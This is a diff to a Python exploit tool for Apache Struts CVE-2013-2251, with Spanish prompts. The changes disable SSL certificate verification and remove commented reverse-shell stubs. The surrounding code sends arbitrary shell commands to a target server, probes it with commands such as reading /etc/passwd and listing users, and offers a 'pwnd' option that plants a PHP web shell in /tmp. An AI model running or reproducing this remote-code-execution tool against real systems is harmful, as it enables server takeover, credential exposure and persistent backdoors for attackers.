@@ -1,13 +1,14 @@
 #!/usr/bin/python
-
+import requests
 import urllib2
+import urllib
 import time
 import sys
 import os
 import commands
-import requests
 import readline
 import urlparse
+import ssl
 
 RED = '\033[1;31m'
 BLUE = '\033[94m'
@@ -36,6 +37,7 @@ print logo
 		
 print " * Ejemplo: http(s)://www.victima.com/files.login\n"
 host = raw_input(BOLD+" [+] HOST: "+ENDC)
+context = ssl._create_unverified_context()
 
 if len(host) > 0:
 	if host.find("https://") != -1 or host.find("http://") != -1:
@@ -62,16 +64,10 @@ if len(host) > 0:
 			arr_lin_win = ["file%20/etc/passwd","dir","net%20users","id","/sbin/ifconfig","cat%20/etc/passwd"]
 			return arr_lin_win
 
-		#def reversepl(ip,port):
-		#	print "perl"
-
-		#def reversepy(ip,port):
-		#	print "python"
-
 		# CVE-2013-2251 ---------------------------------------------------------------------------------
+
 		try:
-			response = ''
-			response = urllib2.urlopen(host+poc)
+			response = urllib.urlopen(host+poc, context=context)
 		except:
 			print RED+" Servidor no responde\n"+ENDC
 			exit(0)
@@ -85,8 +81,6 @@ if len(host) > 0:
 			owned.close()
 
 			opcion = raw_input(YELLOW+"   [-] RUN THIS EXPLOIT (s/n): "+ENDC)
-			#print BOLD+"   * [SHELL REVERSA]"+ENDC
-			#print OTRO+"     Struts@Shell:$ reverse 127.0.0.1 4444 (perl,python,bash)\n"+ENDC
 			if opcion == 's':
 				print YELLOW+"   [-] GET PROMPT...\n"+ENDC
 				time.sleep(1)
@@ -99,7 +93,7 @@ if len(host) > 0:
 					comando = "','".join(espacio)
 
 					if espacio[0] != 'reverse' and espacio[0] != 'pwnd':
-						shell = urllib2.urlopen(host+exploit1("'"+str(comando)+"'"))
+						shell = urllib.urlopen(host+exploit1("'"+str(comando)+"'"), context=context)
 						print "\n"+shell.read()
 					elif espacio[0] == 'pwnd':
 						pathsave=raw_input("path EJ:/tmp/: ")
@@ -107,7 +101,7 @@ if len(host) > 0:
 						if espacio[1] == 'php':
 							shellfile = """'python','-c','f%3dopen("/tmp/status.php","w");f.write("<?php%20system($_GET[ksujenenuhw])?>")'"""
 							urllib2.urlopen(host+pwnd(str(shellfile)))
-							shell = urllib2.urlopen(host+exploit1("'ls','-l','"+pathsave+"status.php'"))
+							shell = urllib.urlopen(host+exploit1("'ls','-l','"+pathsave+"status.php'"), context=context)
 							if shell.read().find(pathsave+"status.php") != -1:
 								print BOLD+GREEN+"\nCreate File Successfull :) ["+pathsave+"status.php]\n"+ENDC
 							else:
